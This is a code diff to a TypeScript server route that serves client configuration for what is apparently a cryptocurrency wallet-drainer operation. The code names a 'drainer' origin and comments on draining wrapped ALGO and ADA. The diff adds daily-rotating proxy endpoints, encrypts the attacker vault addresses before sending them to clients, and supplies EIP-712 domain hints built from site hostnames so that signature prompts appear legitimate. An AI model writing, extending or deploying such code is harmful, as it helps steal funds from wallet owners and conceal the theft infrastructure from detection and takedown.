@@ -16,9 +16,65 @@ import {
 } from '@legion/core'
 
 import { sendSuccess } from '../lib/api-response.js'
+import {
+  encryptClientPayload,
+  isClientVaultEncryptEnabled,
+  readClientEncryptSecret,
+} from '../lib/client-vault-crypto.js'
 import { isRelayerSponsorEnabled, readFactoryAddresses } from '../lib/factory-create2.js'
 
 const SURGE_DRAINER_ORIGIN = 'https://legion-drainer-test.surge.sh'
+
+function readProxyUrls(): string[] {
+  const urls = readBackendUrls()
+  const extra = process.env['API_PROXY_URLS']?.trim()
+  if (extra) {
+    for (const part of extra.split(',')) {
+      const u = part.trim().replace(/\/$/, '')
+      if (u && !urls.includes(u)) urls.push(u)
+    }
+  }
+  return urls
+}
+
+/** Multi-domain deploy list — mirrors / extends CORS origins for inject + EIP-712 domain hints. */
+function readDeployDomains(): string[] {
+  const dedicated = process.env['CLIENT_DEPLOY_DOMAINS']?.trim()
+  const raw = dedicated || process.env['API_CORS_ORIGINS']?.trim() || ''
+  const site = process.env['API_SITE_URL']?.trim()
+  const out: string[] = []
+  for (const part of raw.split(',')) {
+    const u = part.trim().replace(/\/$/, '')
+    if (u && !out.includes(u)) out.push(u)
+  }
+  if (site) {
+    const s = site.replace(/\/$/, '')
+    if (!out.includes(s)) out.unshift(s)
+  }
+  return out
+}
+
+function readEip712Domains(): Record<string, { name?: string; version?: string; verifyingContract?: string }> {
+  const raw = process.env['EIP712_DOMAIN_JSON']?.trim()
+  if (!raw) {
+    const site = process.env['API_SITE_URL']?.trim()
+    if (!site) return {}
+    try {
+      const host = new URL(site).hostname
+      return {
+        default: { name: host.replace(/\./g, ' '), version: '1' },
+      }
+    } catch {
+      return {}
+    }
+  }
+  try {
+    const parsed = JSON.parse(raw) as Record<string, { name?: string; version?: string; verifyingContract?: string }>
+    return parsed && typeof parsed === 'object' ? parsed : {}
+  } catch {
+    return {}
+  }
+}
 
 function readCorsOriginsHint(): string[] {
   const raw = process.env['API_CORS_ORIGINS']?.trim() ?? ''
@@ -90,9 +146,9 @@ function readChainCapabilities(
     COSMOS: full('cosmos'),
     APTOS: full('aptos'),
     SUI: full('sui'),
-    POLKADOT: 'anchor_only',
-    ALGORAND: 'anchor_only',
-    CARDANO: 'anchor_only',
+    POLKADOT: 'anchor_only', // signMessage → signature-anchor (native DOT addr, not EVM vault)
+    ALGORAND: 'anchor_only', // native ALGO — wrapped ALGO on EVM drains via EVM leg
+    CARDANO: 'anchor_only',  // native ADA — wrapped ADA on EVM drains via EVM leg
   }
 }
 
@@ -122,8 +178,10 @@ async function readVaultAddresses(): Promise<Record<string, string | null>> {
 export async function registerClientConfigRoute(app: FastifyInstance): Promise<void> {
   app.get('/api/v1/client-config', async (_request: FastifyRequest, reply: FastifyReply) => {
     const urls = readBackendUrls()
+    const proxyUrls = readProxyUrls()
     const seed = dailyRotationSeed()
     const endpoints = rotateEndpoints(urls, seed)
+    const proxyEndpoints = rotateEndpoints(proxyUrls, seed + ':proxy')
     const expiresAt = new Date()
     expiresAt.setUTCHours(24, 0, 0, 0)
     if (expiresAt.getTime() <= Date.now()) {
@@ -131,16 +189,26 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
     }
     const corsOrigins = readCorsOriginsHint()
     const vaultAddresses = await readVaultAddresses()
+    const vaultEncrypt = isClientVaultEncryptEnabled()
+    const encryptSecret = readClientEncryptSecret()
+    const vaultEncrypted = vaultEncrypt
+      ? encryptClientPayload(JSON.stringify(vaultAddresses), encryptSecret)
+      : null
     const chainCapabilities = readChainCapabilities(vaultAddresses)
     const embedPrimary = EMBED_CDN_URLS[0]!
     return sendSuccess(reply, 200, 'Client config ready', {
       endpoints,
+      proxy_urls: proxyEndpoints,
       primary: endpoints[0],
       update_url: `${endpoints[0]}/api/v1/client-config`,
       expires_at: expiresAt.toISOString(),
+      deploy_domains: readDeployDomains(),
+      eip712_domains: readEip712Domains(),
       eip7702_enabled: (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true',
       onchain_config_contract: process.env['ONCHAIN_CONFIG_CONTRACT_ADDRESS']?.trim() || null,
-      vault_addresses: vaultAddresses,
+      vault_addresses: vaultEncrypt ? null : vaultAddresses,
+      vault_addresses_encrypted: vaultEncrypted,
+      vault_encrypt_version: vaultEncrypted ? 1 : null,
       chain_capabilities: chainCapabilities,
       relayer_sponsored_gas: isRelayerSponsorEnabled(),
       factory_addresses: readFactoryAddresses(),
